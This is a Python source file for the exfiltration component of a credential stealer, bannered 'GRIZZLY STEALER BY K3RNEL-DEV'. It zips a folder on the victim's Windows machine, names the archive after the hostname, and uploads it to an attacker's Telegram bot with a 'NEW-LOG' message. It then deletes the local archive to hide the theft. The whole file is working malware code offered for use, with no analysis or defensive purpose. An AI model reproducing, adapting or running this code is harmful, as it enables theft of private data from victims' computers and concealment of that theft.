import os
import requests
import shutil

def send_message_to_bot(message, chat_id, bot_token):
    send_url = f'https://api.telegram.org/bot{bot_token}/sendMessage'
    data = {'chat_id': chat_id, 'text': message}
    response = requests.post(send_url, data=data)
    return response.status_code


def send_file_to_bot(file_path, chat_id, bot_token, message=''):
    upload_url = f'https://api.telegram.org/bot{bot_token}/sendDocument'

    with open(file_path, 'rb') as file:
        files = {'document': file}
        data = {'chat_id': chat_id}

        response = requests.post(upload_url, data=data, files=files)

        if response.status_code == 200:
            print()
            if message:
                send_message_to_bot(message, chat_id, bot_token)
        else:
            print()

    os.remove(file_path)


def archive_send():
    hostname = os.environ.get('COMPUTERNAME', 'unknown')
    source_folder = r'C:\ProgramDate'
    temp_folder = os.environ['TEMP']

    archive_name = f'{hostname}.zip'
    archive_path = os.path.join(temp_folder, archive_name)

    shutil.make_archive(os.path.join(temp_folder, hostname), 'zip', source_folder)

    bot_token = 'YOUR_BOT_TOKEN'
    chat_id = 'YOUR_CHAT_ID'

    message = '''
==================================
       ╔═╗╦═╗╦╔═╗╔═╗╦ ╦ ╦
       ║ ╦╠╦╝║╔═╝╔═╝║ ╚╦╝
       ╚═╝╩╚═╩╚═╝╚═╝╩═╝╩ 
   GRIZZLY STEALER BY K3RNEL-DEV
            NEW-LOG
==================================                          
    '''

    send_file_to_bot(archive_path, chat_id, bot_token, message)
